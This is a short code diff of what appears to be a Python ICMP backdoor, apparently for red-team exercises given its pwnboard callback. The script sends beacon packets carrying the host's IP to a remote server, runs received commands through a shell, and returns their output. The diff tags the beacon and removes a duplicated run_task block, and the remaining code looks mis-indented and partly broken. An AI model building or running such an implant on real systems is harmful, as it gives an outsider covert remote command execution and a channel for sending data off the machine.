@@ -51,7 +51,7 @@ LOCAL_IP = get_local_ip()
 
 def send_beacon():
     # include local IP in payload for server to parse
-    payload = f"BEACON|{LOCAL_IP}".encode()
+    payload = f"BEACON|{LOCAL_IP}|ThisIsABeacon".encode()
     pkt = IP(dst=SERVER_IP)/ICMP(type=8)/payload
     send(pkt, verbose=0)
     pwnboard_callback(LOCAL_IP)
@@ -70,16 +70,6 @@ def handle_incoming(pkt):
 
 def run_task(cmd):
     # Execute and send back results
-    MAX_PAYLOAD = 1460
-    PREFIX = b"RESULT|"
-
-    try:
-        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
-        result_bytes = output
-    except Exception as e:
-        result_bytes = str(e).encode(errors="ignore")
-
-    def run_task(cmd):
     MAX_PAYLOAD = 1460
     PREFIX = b"RESULT|"
 
